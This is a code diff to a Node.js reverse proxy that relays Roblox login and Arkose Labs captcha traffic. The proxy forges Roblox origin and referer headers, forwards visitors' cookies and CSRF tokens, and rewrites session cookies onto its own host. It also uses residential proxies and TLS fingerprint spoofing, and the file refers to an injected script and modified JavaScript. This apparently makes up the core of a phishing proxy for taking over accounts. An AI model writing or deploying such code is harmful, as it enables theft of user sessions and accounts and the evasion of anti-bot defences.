@@ -489,6 +489,13 @@ const ARKOSE_ROUTES = [
     ['/apis-rbxcdn',    'https://apis.rbxcdn.com'],
 ];
 
+// Roblox Captcha API — handles /v2/{publicKey}/api.js and related endpoints
+// This MUST be registered BEFORE the catch-all main page handler
+const ROBLOX_CAPTCHA_HOST = 'captcha.roblox.com';
+
+// UUID pattern for Arkose public keys (e.g., 476068BF-9607-4799-B53D-966BE98E2B81)
+const ARKOSE_PUBLIC_KEY_PATTERN = /^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$/i;
+
 // Standard Roblox API routes — NOW USING CURL-IMPERSONATE
 const API_ROUTES = [
     // Challenge system (critical for login)
@@ -549,6 +556,180 @@ for (const [prefix, target] of ARKOSE_ROUTES) {
 for (const [prefix, target, pathPrefix] of API_ROUTES) {
     app.use(prefix, createCurlProxy(target, pathPrefix, false));
 }
+
+// ─────────────────────────────────────────────────────────────
+// ARKOSE LABS CAPTCHA /v2/ ENDPOINTS (CRITICAL FOR LOGIN CHALLENGE)
+// These endpoints serve the Arkose Labs captcha script and handle challenge verification
+// ─────────────────────────────────────────────────────────────
+app.use('/v2', async (req, res) => {
+    const origin = req.headers['origin'] || `https://${req.headers.host}`;
+    setCors(res, origin);
+
+    // Parse the path to determine the target
+    // Path format: /v2/{publicKey}/api.js or /v2/{publicKey}/... or /v2/funcaptcha/...
+    const pathParts = req.path.split('/').filter(p => p.length > 0);
+
+    // Determine target host based on path pattern
+    let targetHost = ROBLOX_CAPTCHA_HOST;
+    let targetPath = req.path;
+
+    // Check if first part looks like an Arkose public key (UUID format)
+    if (pathParts.length > 0 && ARKOSE_PUBLIC_KEY_PATTERN.test(pathParts[0])) {
+        // This is an Arkose Labs captcha endpoint: /v2/{publicKey}/...
+        // Route to captcha.roblox.com which proxies to Arkose
+        console.log(`[captcha] Arkose public key detected: ${pathParts[0]}`);
+    } else if (pathParts[0] === 'funcaptcha' || pathParts[0] === 'challenge') {
+        // Funcaptcha/challenge endpoints
+        console.log(`[captcha] Funcaptcha/challenge endpoint: ${req.path}`);
+    } else {
+        // Unknown /v2/ path - try to proxy to captcha.roblox.com anyway
+        console.log(`[captcha] Unknown /v2/ path, proxying to captcha: ${req.path}`);
+    }
+
+    // Fix double slash issue
+    targetPath = targetPath.replace(/\/+/g, '/');
+    if (!targetPath.startsWith('/')) targetPath = '/' + targetPath;
+
+    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
+    const targetUrl = `https://${targetHost}${targetPath}${qs}`;
+
+    console.log(`[captcha] ${req.method} ${req.path} → ${targetUrl}`);
+
+    // Build headers mimicking a real browser request
+    const headers = {
+        'Origin':          'https://www.roblox.com',
+        'Referer':         'https://www.roblox.com/login',
+        'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
+        'Accept':          req.headers['accept'] || '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+    };
+
+    if (req.headers['content-type']) {
+        headers['Content-Type'] = req.headers['content-type'];
+    }
+    if (req.headers['cookie']) {
+        headers['Cookie'] = req.headers['cookie'];
+    }
+    if (req.headers['x-csrf-token']) {
+        headers['X-CSRF-Token'] = req.headers['x-csrf-token'];
+    }
+    if (req.headers['rbx-device-id']) {
+        headers['rbx-device-id'] = req.headers['rbx-device-id'];
+    }
+
+    // Forward challenge headers
+    for (const h of CHALLENGE_HEADERS) {
+        if (req.headers[h]) headers[h] = req.headers[h];
+    }
+
+    // Get body for POST/PUT/PATCH
+    let body = null;
+    if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
+        body = await new Promise((resolve) => {
+            const bufs = [];
+            req.on('data', c => bufs.push(c));
+            req.on('end', () => resolve(Buffer.concat(bufs)));
+        });
+    }
+
+    try {
+        // Use curl-impersonate with residential proxy for captcha endpoints
+        const result = await makeCurlRequest(
+            req.method,
+            targetUrl,
+            headers,
+            body,
+            true // Use residential proxy for captcha (high security)
+        );
+
+        console.log(`[captcha] ← ${result.statusCode}`);
+
+        // Forward response headers
+        const skipHdrs = new Set([
+            'content-security-policy', 'content-security-policy-report-only',
+            'x-content-security-policy', 'transfer-encoding', 'connection',
+            'content-encoding', 'keep-alive', 'proxy-authenticate',
+            'proxy-authorization', 'te', 'trailers', 'upgrade'
+        ]);
+
+        for (const [k, v] of Object.entries(result.headers)) {
+            if (skipHdrs.has(k)) continue;
+            if (k === 'set-cookie') {
+                res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
+            } else {
+                try { res.set(k, v); } catch (_) {}
+            }
+        }
+
+        // Set content-type for JS files if not already set
+        if (req.path.endsWith('.js') && !result.headers['content-type']) {
+            res.set('Content-Type', 'application/javascript; charset=utf-8');
+        }
+
+        res.status(result.statusCode).send(result.body);
+
+    } catch (err) {
+        console.error(`[captcha] ❌ ${req.method} ${req.path} | ${err.message}`);
+        if (!res.headersSent) {
+            res.status(502).json({ error: 'Captcha proxy error', message: err.message });
+        }
+    }
+});
+
+// ─────────────────────────────────────────────────────────────
+// FUNCAPTCHA DIRECT PATHS (sometimes used by Arkose)
+// ─────────────────────────────────────────────────────────────
+app.use('/funcaptcha', async (req, res) => {
+    const origin = req.headers['origin'] || `https://${req.headers.host}`;
+    setCors(res, origin);
+
+    // Fix double slash issue
+    let targetPath = req.path.replace(/\/+/g, '/');
+    if (!targetPath.startsWith('/')) targetPath = '/' + targetPath;
+
+    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
+    const targetUrl = `https://${ROBLOX_CAPTCHA_HOST}/funcaptcha${targetPath}${qs}`;
+
+    console.log(`[funcaptcha] ${req.method} ${req.path} → ${targetUrl}`);
+
+    const headers = {
+        'Origin':          'https://www.roblox.com',
+        'Referer':         'https://www.roblox.com/login',
+        'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
+        'Accept':          req.headers['accept'] || '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+    };
+
+    if (req.headers['cookie']) headers['Cookie'] = req.headers['cookie'];
+    if (req.headers['content-type']) headers['Content-Type'] = req.headers['content-type'];
+
+    let body = null;
+    if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
+        body = await new Promise((resolve) => {
+            const bufs = [];
+            req.on('data', c => bufs.push(c));
+            req.on('end', () => resolve(Buffer.concat(bufs)));
+        });
+    }
+
+    try {
+        const result = await makeCurlRequest(req.method, targetUrl, headers, body, true);
+        console.log(`[funcaptcha] ← ${result.statusCode}`);
+
+        for (const [k, v] of Object.entries(result.headers)) {
+            if (k === 'set-cookie') {
+                res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
+            } else {
+                try { res.set(k, v); } catch (_) {}
+            }
+        }
+        res.status(result.statusCode).send(result.body);
+    } catch (err) {
+        console.error(`[funcaptcha] ❌ ${err.message}`);
+        if (!res.headersSent) res.status(502).json({ error: 'Funcaptcha proxy error', message: err.message });
+    }
+});
 
 // ─────────────────────────────────────────────────────────────
 // INJECTED SCRIPT
@@ -678,5 +859,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Proxy running on port ${PORT}`);
     console.log(`📁 Modified JS from: ${path.join(__dirname, 'modified-js')}`);
     console.log(`📋 ${API_ROUTES.length} API routes | ${ARKOSE_ROUTES.length} Arkose routes`);
+    console.log(`🧩 Captcha routes: /v2/* → captcha.roblox.com | /funcaptcha/* → captcha.roblox.com`);
     console.log(`🔒 ALL requests now use curl-impersonate for TLS fingerprint spoofing`);
 });
